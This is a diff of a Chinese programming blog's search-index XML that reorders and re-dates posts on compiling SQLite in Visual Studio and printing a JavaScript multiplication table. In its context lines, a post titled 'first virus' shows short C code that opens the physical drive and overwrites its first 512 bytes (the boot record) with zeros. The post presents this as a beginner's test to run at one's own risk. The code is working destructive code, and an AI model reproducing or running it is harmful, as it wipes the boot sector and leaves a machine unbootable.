@@ -3,6 +3,68 @@
   
     
     <entry>
+      <title><![CDATA[window编译sqlite3]]></title>
+      <url>/2024/window-cpp-compile-sqlite3/</url>
+      <content type="html"><![CDATA[<p>windows cpp 编译sqlite3</p>
+<a id="more"></a>
+<p>下载 <a href="https://www.sqlite.org/2019/sqlite-preprocessed-3280000.zip" target="_blank" rel="noopener">https://www.sqlite.org/2019/sqlite-preprocessed-3280000.zip</a><br>解压D:\sqlite-preprocessed-3280000</p>
+<p>把.c和.h文件分离，创建一个include文件夹用来存放.h文件</p>
+<ol>
+<li>打开visual studio 2017 创建一个c++控制台项目</li>
+</ol>
+<p>名称：sqlitetest</p>
+<ol>
+<li>添加头文件</li>
+</ol>
+<p>解决方案资源管理器 -》头文件 -》 右键 -》添加 -》现有项</p>
+<p>选中include中所有的.h文件</p>
+<ol>
+<li>添加.c文件</li>
+</ol>
+<p>解决方案资源管理器 -》源文件 -》 右键 -》添加 -》现有项</p>
+<p>选中所有的.c文件</p>
+<ol>
+<li>编译<br>visual studio 菜单栏 -》项目 -》sqlitetest属性</li>
+</ol>
+<p>配置：Release</p>
+<p>配置属性 -》C/C++ -》常规 -》附加包含目录 -》点击编辑</p>
+<p>点击带*的文件夹图标 -》点击… -》选中D:\sqlite-preprocessed-3280000\include</p>
+<p>visual studio 工具栏 -》Debug 改成 Release</p>
+<p>visual studio 菜单栏 -》生成 -》生成解决方案</p>
+<p>解决编译报错</p>
+<ol>
+<li>找到sqlite3ext.h</li>
+</ol>
+<p>在#define SQLITE3EXT_H 下一行添加 #define SQLITE_CORE 1</p>
+<ol>
+<li>排除文件<br>fts1.c, fts2.c, icu.c, tclsqlite.c, fts3_tokenizer.c</li>
+</ol>
+<p>右键 -》从项目中排除</p>
+<p>这样就可以编译成功了</p>
+<p>编写测试代码 sqlitetest.cpp</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;sqlite3.h&quot;</span><br><span class="line"></span><br><span class="line">int create(sqlite3** db) &#123;</span><br><span class="line">	int rc = sqlite3_open(&quot;test.db&quot;, db);</span><br><span class="line">	std::string sql = &quot;create table if not exists test(name text)&quot;;</span><br><span class="line">	rc = sqlite3_exec(*db, sql.c_str(), NULL, NULL, NULL);</span><br><span class="line">  std::cout &lt;&lt; &quot;rc:&quot; &lt;&lt; rc &lt;&lt; &quot;\n&quot;;</span><br><span class="line">	return rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  std::cout &lt;&lt; &quot;Hello World!\n&quot;;</span><br><span class="line">	sqlite3* db = NULL;</span><br><span class="line">	int rc = create(&amp;db);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>visual studio 工具栏  -》 点击本地Windows调试器</p>
+<p>会看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">rc:0</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      
+        <categories>
+            
+            <category> c </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> c </tag>
+            
+            <tag> PC微信 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[深入理解计算机浮点数存储]]></title>
       <url>/2022/cs-float-store-1/</url>
       <content type="html"><![CDATA[<p>深入理解计算机浮点数存储</p>
@@ -432,68 +494,6 @@ G1 计划作为 Concurrent Mark-Sweep Collector (CMS) 的长期替代品。将 G
             <tag> java </tag>
             
             <tag> gc </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
-      <title><![CDATA[window编译sqlite3]]></title>
-      <url>/2020/window-cpp-compile-sqlite3/</url>
-      <content type="html"><![CDATA[<p>windows cpp 编译sqlite3</p>
-<a id="more"></a>
-<p>下载 <a href="https://www.sqlite.org/2019/sqlite-preprocessed-3280000.zip" target="_blank" rel="noopener">https://www.sqlite.org/2019/sqlite-preprocessed-3280000.zip</a><br>解压D:\sqlite-preprocessed-3280000</p>
-<p>把.c和.h文件分离，创建一个include文件夹用来存放.h文件</p>
-<ol>
-<li>打开visual studio 2017 创建一个c++控制台项目</li>
-</ol>
-<p>名称：sqlitetest</p>
-<ol>
-<li>添加头文件</li>
-</ol>
-<p>解决方案资源管理器 -》头文件 -》 右键 -》添加 -》现有项</p>
-<p>选中include中所有的.h文件</p>
-<ol>
-<li>添加.c文件</li>
-</ol>
-<p>解决方案资源管理器 -》源文件 -》 右键 -》添加 -》现有项</p>
-<p>选中所有的.c文件</p>
-<ol>
-<li>编译<br>visual studio 菜单栏 -》项目 -》sqlitetest属性</li>
-</ol>
-<p>配置：Release</p>
-<p>配置属性 -》C/C++ -》常规 -》附加包含目录 -》点击编辑</p>
-<p>点击带*的文件夹图标 -》点击… -》选中D:\sqlite-preprocessed-3280000\include</p>
-<p>visual studio 工具栏 -》Debug 改成 Release</p>
-<p>visual studio 菜单栏 -》生成 -》生成解决方案</p>
-<p>解决编译报错</p>
-<ol>
-<li>找到sqlite3ext.h</li>
-</ol>
-<p>在#define SQLITE3EXT_H 下一行添加 #define SQLITE_CORE 1</p>
-<ol>
-<li>排除文件<br>fts1.c, fts2.c, icu.c, tclsqlite.c, fts3_tokenizer.c</li>
-</ol>
-<p>右键 -》从项目中排除</p>
-<p>这样就可以编译成功了</p>
-<p>编写测试代码 sqlitetest.cpp</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &quot;sqlite3.h&quot;</span><br><span class="line"></span><br><span class="line">int create(sqlite3** db) &#123;</span><br><span class="line">	int rc = sqlite3_open(&quot;test.db&quot;, db);</span><br><span class="line">	std::string sql = &quot;create table if not exists test(name text)&quot;;</span><br><span class="line">	rc = sqlite3_exec(*db, sql.c_str(), NULL, NULL, NULL);</span><br><span class="line">  std::cout &lt;&lt; &quot;rc:&quot; &lt;&lt; rc &lt;&lt; &quot;\n&quot;;</span><br><span class="line">	return rc;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">  std::cout &lt;&lt; &quot;Hello World!\n&quot;;</span><br><span class="line">	sqlite3* db = NULL;</span><br><span class="line">	int rc = create(&amp;db);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>visual studio 工具栏  -》 点击本地Windows调试器</p>
-<p>会看到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Hello World!</span><br><span class="line">rc:0</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      
-        <categories>
-            
-            <category> c </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> c </tag>
-            
-            <tag> PC微信 </tag>
             
         </tags>
         
@@ -1691,27 +1691,6 @@ y_i=\sum_jw_jx_{ij}</script><ol>
     </entry>
     
     <entry>
-      <title><![CDATA[javascript写九九乘法表]]></title>
-      <url>/2013/javascript-jiujiuchengfabiao/</url>
-      <content type="html"><![CDATA[<p>这篇文章主要讲解 九九乘法表<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       tr td&#123;</span><br><span class="line">         border:2px solid green;</span><br><span class="line">         font-size:20px;</span><br><span class="line">         font-weight:bold;</span><br><span class="line">       &#125;</span><br><span class="line">       &lt;/style&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">       document.write(&quot;&lt;table&gt;&quot;);</span><br><span class="line">       for(var x=1;x&lt;=9;x++)&#123;</span><br><span class="line">            document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">            for(var y=1;y&lt;=x;y++)&#123;</span><br><span class="line">                document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            document.write(&quot;&lt;/tr&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;&lt;/table&gt;&quot;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
-]]></content>
-      
-        <categories>
-            
-            <category> javascript </category>
-            
-        </categories>
-        
-        
-        <tags>
-            
-            <tag> javascript </tag>
-            
-        </tags>
-        
-    </entry>
-    
-    <entry>
       <title><![CDATA[第一个病毒]]></title>
       <url>/2013/first-virus/</url>
       <content type="html"><![CDATA[<p>这篇文章主要讲解 使用c写一个小程序<br>下面是初学c语言写的代码（测试，自行承担后果哦）：<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; </span><br><span class="line">#include &lt;stdlib.h&gt; </span><br><span class="line"> </span><br><span class="line">int main() </span><br><span class="line">&#123;</span><br><span class="line"> char buffer[512]=&quot;0&quot;;</span><br><span class="line">    FILE * fd=fopen(&quot;\\\\.\\PHYSICALDRIVE0&quot;,&quot;rb+&quot;); </span><br><span class="line">    if (fd == NULL) </span><br><span class="line">        return 0;  </span><br><span class="line">    fseek(fd,0,SEEK_SET); </span><br><span class="line">    fwrite(buffer,512,1,fd);</span><br><span class="line"> printf(&quot;hello,你中毒了！\n&quot;);</span><br><span class="line">    fclose(fd); </span><br><span class="line">    return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
@@ -1729,6 +1708,27 @@ y_i=\sum_jw_jx_{ij}</script><ol>
             <tag> c </tag>
             
             <tag> 病毒 </tag>
+            
+        </tags>
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[javascript写九九乘法表]]></title>
+      <url>/2013/javascript-jiujiuchengfabiao/</url>
+      <content type="html"><![CDATA[<p>这篇文章主要讲解 九九乘法表<br><a id="more"></a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;head&gt;</span><br><span class="line">      &lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">       tr td&#123;</span><br><span class="line">         border:2px solid green;</span><br><span class="line">         font-size:20px;</span><br><span class="line">         font-weight:bold;</span><br><span class="line">       &#125;</span><br><span class="line">       &lt;/style&gt;</span><br><span class="line">       &lt;script type=&quot;text/javascript&quot;&gt;</span><br><span class="line">       document.write(&quot;&lt;table&gt;&quot;);</span><br><span class="line">       for(var x=1;x&lt;=9;x++)&#123;</span><br><span class="line">            document.write(&quot;&lt;tr&gt;&quot;);</span><br><span class="line">            for(var y=1;y&lt;=x;y++)&#123;</span><br><span class="line">                document.write(&quot;&lt;td&gt;&quot; + y + &quot;*&quot; + x + &quot;=&quot; + (x*y) + &quot;&lt;/td&gt;&quot;)</span><br><span class="line">            &#125;</span><br><span class="line">            document.write(&quot;&lt;/tr&gt;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        document.write(&quot;&lt;/table&gt;&quot;);</span><br><span class="line">        &lt;/script&gt;</span><br><span class="line">    &lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p>
+]]></content>
+      
+        <categories>
+            
+            <category> javascript </category>
+            
+        </categories>
+        
+        
+        <tags>
+            
+            <tag> javascript </tag>
             
         </tags>
         
